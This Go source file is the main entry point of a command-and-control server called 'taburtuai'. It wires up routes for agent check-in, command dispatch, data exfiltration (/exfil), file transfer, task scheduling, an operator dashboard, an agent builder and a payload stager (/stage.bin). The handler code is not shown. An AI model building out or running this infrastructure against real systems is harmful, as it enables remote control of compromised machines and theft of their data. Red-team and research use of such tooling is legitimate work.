package main

import (
	"log"
	"net/http"

	"taburtuai/server/handlers"
	"taburtuai/task"
)

func main() {
	go task.CheckScheduledTasks() // start scheduler loop

	http.HandleFunc("/ping", handlers.PingHandler)
	http.HandleFunc("/result", handlers.ResultHandler)
	http.HandleFunc("/command", handlers.CommandHandler)
	http.HandleFunc("/exfil", handlers.ExfilHandler)
	http.HandleFunc("/upload", handlers.UploadHandler)
	http.HandleFunc("/download", handlers.DownloadHandler)
	http.HandleFunc("/schedule", handlers.ScheduleHandler)

	http.HandleFunc("/dashboard", handlers.DashboardHandler)
	http.HandleFunc("/commandUI", handlers.CommandUIHandler)
	http.HandleFunc("/exfilUI", handlers.ExfilUIHandler)
	http.HandleFunc("/uploadUI", handlers.UploadUIHandler)

	http.HandleFunc("/getconfig", handlers.GetConfigHandler)

	http.HandleFunc("/buildUI", handlers.BuildUIHandler)
	http.HandleFunc("/buildAgent", handlers.BuildAgentHandler)

	http.HandleFunc("/stage.bin", handlers.StageHandler)

	log.Println("[+] C2 Server running on :8080")
	http.ListenAndServe(":8080", nil)
}
